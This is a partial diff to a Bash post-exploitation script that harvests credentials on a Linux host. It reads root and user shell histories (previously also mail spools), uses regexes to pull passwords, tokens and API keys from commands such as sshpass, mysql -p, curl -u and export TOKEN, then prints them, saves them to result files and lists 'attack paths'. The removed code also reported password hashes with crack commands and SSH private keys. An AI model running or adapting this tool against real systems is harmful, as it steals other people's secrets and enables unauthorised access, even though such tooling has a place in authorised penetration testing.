+        all_files=$(echo "$all_files" | grep -E "\.(${EXTENSIONS//,/|})$")
     TOTAL_FILES=$(echo "$all_files" | grep -c . 2>/dev/null || echo 0)
     [[ -z "$(echo "$all_files" | tr -d '[:space:]')" ]] && TOTAL_FILES=0
 
@@ -395,192 +430,87 @@ main() {
         done <<< "$all_files"
     fi
 
-    # ── Mail directories ───────────────────────────────────────────────────────
-    if [[ -n "$PATTERN" ]]; then
-        for td in "${TARGET_DIRS[@]}"; do
-            for mdir in "${td}/mail" "${td}/spool/mail"; do
-                [[ ! -d "$mdir" ]] && continue
-                while IFS= read -r mf; do
-                    [[ -z "$mf" ]] && continue
-                    local full="${mdir}/${mf}"
-                    [[ ! -r "$full" ]] && continue
-                    if grep -qiE "$PATTERN" "$full" 2>/dev/null; then
-                        local prev; prev=$(grep -m1 -iE "$PATTERN" "$full" 2>/dev/null | sed 's/^[[:space:]]*//')
-                        [[ ${#prev} -gt 100 ]] && prev="${prev:0:97}..."
-                        finding "MAIL" "Pattern hit: ${prev}" "${full}"
-                        extract_cred_context "$prev" "$full"
-                    fi
-                    if grep -qiE "password|passwd|pass:|credentials|secret" "$full" 2>/dev/null; then
-                        local cl; cl=$(grep -m1 -iE "password|passwd|pass:|credentials|secret" "$full" 2>/dev/null | sed 's/^[[:space:]]*//')
-                        [[ ${#cl} -gt 100 ]] && cl="${cl:0:97}..."
-                        finding "MAIL" "Cred keyword: ${cl}" "${full}"
-                        extract_cred_context "$cl" "$full"
-                        ATTACK_PATHS+=("Read mail: cat ${full}")
-                    fi
-                done < <(ls -1 "$mdir" 2>/dev/null)
-            done
-        done
-    fi
-
     # ── History hunting (-H) ───────────────────────────────────────────────────
     if [[ $HISTORY_MODE -eq 1 ]]; then
-        local hist_pat='sshpass[[:space:]]+-p|mysql[[:space:]].*-p[^[:space:]]|mysqladmin[[:space:]].*-p|curl[[:space:]].*(-u|--user)[[:space:]]+[^[:space:]]+:[^[:space:]]|wget[[:space:]].*(--password|--http-password)[=[:space:]][^[:space:]]|export[[:space:]]+(PASSWORD|PASS|SECRET|TOKEN|KEY|API_KEY)[=[:space:]]|[Pp]ass(word)?[[:space:]]*=[[:space:]]*[^[:space:]]|--password[=[:space:]][^[:space:]]|-passwd[[:space:]]+[^[:space:]]'
-        local hist_files=()
-        for f in /root/.bash_history /root/.zsh_history /root/.sh_history \
-                  /home/*/.bash_history /home/*/.zsh_history /home/*/.sh_history \
-                  /home/*/.local/share/fish/fish_history ~/.bash_history ~/.zsh_history; do
-            [[ -f "$f" && -r "$f" ]] && hist_files+=("$f")
+        local hist_pat='sshpass[[:space:]]+-p|mysql[[:space:]].*-p[^[:space:]]|curl[[:space:]].*(-u|--user)[[:space:]]+[^[:space:]]+:[^[:space:]]|wget[[:space:]].*(--password|--http-password)[=[:space:]][^[:space:]]|export[[:space:]]+(PASSWORD|PASS|SECRET|TOKEN|KEY|API_KEY)[=[:space:]]|[Pp]ass(word)?[[:space:]]*=[[:space:]]*\S|--password[=[:space:]]\S'
+        local hfiles=()
+        for f in /root/.bash_history /root/.zsh_history \
+                  /home/*/.bash_history /home/*/.zsh_history \
+                  ~/.bash_history ~/.zsh_history; do
+            [[ -f "$f" && -r "$f" ]] && hfiles+=("$f")
         done
 
         declare -A _sh=(); declare -a _uh=()
-        for f in "${hist_files[@]}"; do
+        for f in "${hfiles[@]}"; do
             local real; real=$(realpath "$f" 2>/dev/null || echo "$f")
             [[ -z "${_sh[$real]+x}" ]] && { _sh[$real]=1; _uh+=("$real"); }
         done
 
-        if [[ ${#_uh[@]} -eq 0 ]]; then
-            clear_progress
-            echo -e "  ${DIM}[hist] no readable history files found${RST}"
-        else
-            for hf in "${_uh[@]}"; do
-                local owner; owner=$(stat -c '%U' "$hf" 2>/dev/null || echo "?")
-                local hits; hits=$(grep -nE "$hist_pat" "$hf" 2>/dev/null)
-                if [[ -n "$hits" ]]; then
-                    while IFS= read -r hit; do
-                        [[ -z "$hit" ]] && continue
-                        local ln="${hit%%:*}" cmd="${hit#*:}"
-                        cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
-                        [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
-                        finding "HIST" "${cmd}" "${hf}:${ln} (${owner})"
-                        extract_cred_context "$cmd" "$hf"
-                        ATTACK_PATHS+=("Review history: cat ${hf}")
-                    done <<< "$hits"
-                fi
-                if [[ -n "$PATTERN" ]]; then
-                    local phits; phits=$(grep -nE "$PATTERN" "$hf" 2>/dev/null)
-                    if [[ -n "$phits" ]]; then
-                        while IFS= read -r hit; do
-                            [[ -z "$hit" ]] && continue
-                            local ln="${hit%%:*}" cmd="${hit#*:}"
-                            cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
-                            [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
-                            finding "HIST" "${cmd}" "${hf}:${ln} (${owner})"
-                            extract_cred_context "$cmd" "$hf"
-                        done <<< "$phits"
-                    fi
-                fi
+        for hf in "${_uh[@]}"; do
+            local owner; owner=$(stat -c '%U' "$hf" 2>/dev/null || echo "?")
+
+            # Credential-leaking commands
+            local hits; hits=$(grep -nE "$hist_pat" "$hf" 2>/dev/null)
+            if [[ -n "$hits" ]]; then
+                while IFS= read -r hit; do
+                    [[ -z "$hit" ]] && continue
+                    local ln="${hit%%:*}" cmd="${hit#*:}"
+                    cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
+                    local val; val=$(extract_cred_value "$cmd")
+                    [[ -z "$val" ]] && val="$cmd"
+                    [[ ${#val} -gt 100 ]] && val="${val:0:97}..."
+                    clear_progress
+                    printf "[%s] ${Y}%-10s${RST} ${W}→${RST}  ${R}%s${RST}   ${DIM}%s${RST}\n" \
+                        "$(ts)" "hist:${owner}" "$val" "${hf}:${ln}"
+                    rwrite "history.txt" "$(printf '%-12s → %s   (%s:%s)' "$owner" "$val" "$hf" "$ln")"
+                    ATTACK_PATHS+=("History hit for ${owner}: ${val}")
+                done <<< "$hits"
+            fi
+
+            # Also grep for target names in history
+            for t in "${TARGETS[@]}"; do
+                local thits; thits=$(grep -nE "\b${t}\b" "$hf" 2>/dev/null)
+                [[ -z "$thits" ]] && continue
+                while IFS= read -r hit; do
+                    [[ -z "$hit" ]] && continue
+                    local ln="${hit%%:*}" cmd="${hit#*:}"
+                    cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
+                    [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
+                    clear_progress
+                    printf "[%s] ${Y}%-10s${RST} ${W}→${RST}  ${DIM}%s${RST}   ${DIM}%s${RST}\n" \
+                        "$(ts)" "$t" "$cmd" "${hf}:${ln}"
+                    rwrite "history.txt" "$(printf '%-12s → %s   (%s:%s)' "$t" "$cmd" "$hf" "$ln")"
+                done <<< "$thits"
             done
-        fi
+        done
     fi
 
-    # ── End ────────────────────────────────────────────────────────────────────
+    # ── Done ──────────────────────────────────────────────────────────────────
     end_progress
 
     local end_time duration
     end_time=$(date +%s); duration=$((end_time - start_time))
-    local total=$(( ${#CRED_PAIRS[@]} + ${#HASHES[@]} + ${#B64_FINDS[@]} + ${#KEY_FINDS[@]} ))
+    local total=$(( ${#ALL_CREDS[@]} + ${#ALL_HASHES[@]} + ${#ALL_KEYS[@]} ))
 
     echo ""
-    echo -e "${G}Task Completed${RST} ${DIM}| ${duration}s | ${FILES_SCANNED} files | ${FOUND_COUNT} hits | ${total} actionable${RST}"
+    echo -e "${G}Task Completed${RST} ${DIM}| ${duration}s | ${FILES_SCANNED} files | ${FOUND_COUNT} credentials found${RST}"
     echo -e " ${DIM}→ ${RESULTS_DIR}/${RST}"
     echo ""
 
-    # ── Write summary + credential files ──────────────────────────────────────
-    if [[ ${#CRED_PAIRS[@]} -gt 0 ]]; then
-        rwrite "credentials.txt" ""
-        rwrite "credentials.txt" "── Extracted Credentials ───────────────────────────────────"
-        local -A sc
-        for entry in "${CRED_PAIRS[@]}"; do
-            local src="${entry%%|*}" rest="${entry#*|}"
-            local u="${rest%%|*}" p="${rest#*|}" k="${rest%%|*}:${rest#*|}"
-            if [[ -z "${sc[$k]+x}" ]]; then
-                sc[$k]=1; rwrite "credentials.txt" "  ${u}:${p}  ← ${src}"
-            fi
-        done
-    fi
-
-    if [[ ${#HASHES[@]} -gt 0 ]]; then
-        rwrite "hashes.txt" ""
-        rwrite "hashes.txt" "── Hash Summary ────────────────────────────────────────────"
-        for entry in "${HASHES[@]}"; do
-            IFS='|' read -r ht hash cc src <<< "$entry"
-            rwrite "hashes.txt" "  type:  ${ht}"
-            rwrite "hashes.txt" "  hash:  ${hash}"
-            rwrite "hashes.txt" "  crack: ${cc}"
-            rwrite "hashes.txt" "  from:  ${src}"
-            rwrite "hashes.txt" ""
-        done
-    fi
-
+    # ── Write summary ──────────────────────────────────────────────────────────
     rwrite "00-summary.txt" ""
     rwrite "00-summary.txt" "── Attack Paths ────────────────────────────────────────────"
     local i=1; local -A sp
-    for path in "${ATTACK_PATHS[@]}"; do
-        if [[ -z "${sp[$path]+x}" ]]; then
-            sp[$path]=1; rwrite "00-summary.txt" "  ${i}. ${path}"; i=$((i+1))
-        fi
+    for p in "${ATTACK_PATHS[@]}"; do
+        [[ -z "${sp[$p]+x}" ]] && { sp[$p]=1; rwrite "00-summary.txt" "  ${i}. ${p}"; i=$((i+1)); }
     done
     rwrite "00-summary.txt" ""
     rwrite "00-summary.txt" "── Stats ───────────────────────────────────────────────────"
-    rwrite "00-summary.txt" "  Duration:    ${duration}s"
-    rwrite "00-summary.txt" "  Files:       ${FILES_SCANNED}"
-    rwrite "00-summary.txt" "  Raw hits:    ${FOUND_COUNT}"
-    rwrite "00-summary.txt" "  Actionable:  ${total}"
-    rwrite "00-summary.txt" "  Creds:       ${#CRED_PAIRS[@]}"
-    rwrite "00-summary.txt" "  Hashes:      ${#HASHES[@]}"
-    rwrite "00-summary.txt" "  Keys:        ${#KEY_FINDS[@]}"
-    rwrite "00-summary.txt" "  B64 secrets: ${#B64_FINDS[@]}"
+    rwrite "00-summary.txt" "  Duration: ${duration}s | Files: ${FILES_SCANNED} | Credentials: ${FOUND_COUNT}"
 
-    # ── Full report on screen (-F) ─────────────────────────────────────────────
-    if [[ $FULL_REPORT -eq 1 ]]; then
-        local -A sf
-        if [[ ${#CRED_PAIRS[@]} -gt 0 ]]; then
-            echo -e " ${W}Credentials${RST}"
-            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
-            for entry in "${CRED_PAIRS[@]}"; do
-                local src="${entry%%|*}" rest="${entry#*|}"
-                local u="${rest%%|*}" p="${rest#*|}" k="${rest%%|*}:${rest#*|}"
-                if [[ -z "${sf[$k]+x}" ]]; then
-                    sf[$k]=1; echo -e "  ${C}${u}${RST}:${R}${p}${RST}  ${DIM}← ${src}${RST}"
-                fi
-            done
-            echo ""
-        fi
-        if [[ ${#HASHES[@]} -gt 0 ]]; then
-            echo -e " ${W}Hashes${RST}"
-            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
-            for entry in "${HASHES[@]}"; do
-                IFS='|' read -r ht hash cc src <<< "$entry"
-                echo -e "  ${Y}${ht}${RST}  ${hash:0:60}  ${DIM}← ${src}${RST}"
-                echo -e "    ${DIM}crack:${RST} ${Y}${cc}${RST}"
-            done
-            echo ""
-        fi
-        if [[ ${#KEY_FINDS[@]} -gt 0 ]]; then
-            echo -e " ${W}SSH Keys${RST}"
-            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
-            for entry in "${KEY_FINDS[@]}"; do
-                IFS='|' read -r kpath ktype kenc <<< "$entry"
-                echo -e "  ${R}${ktype}${RST} (${kenc})  ${DIM}${kpath}${RST}"
-            done
-            echo ""
-        fi
-        if [[ ${#ATTACK_PATHS[@]} -gt 0 ]]; then
-            echo -e " ${W}Attack Paths${RST}"
-            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
-            local j=1; local -A sg
-            for path in "${ATTACK_PATHS[@]}"; do
-                if [[ -z "${sg[$path]+x}" ]]; then
-                    sg[$path]=1; echo -e "  ${G}${j}.${RST} ${path}"; j=$((j+1))
-                fi
-            done
-            echo ""
-        fi
-    fi
-
-    if [[ $total -eq 0 && $FOUND_COUNT -eq 0 ]]; then
+    if [[ $FOUND_COUNT -eq 0 ]]; then
         echo -e "  ${Y}No credentials found.${RST}"
-        echo -e "  ${DIM}Try a broader pattern, different directory, or -H for history hunting${RST}"
+        echo -e "  ${DIM}Tips: check permissions, try -d /var/mail+etc+home, use -H${RST}"
         echo ""
     fi
 }
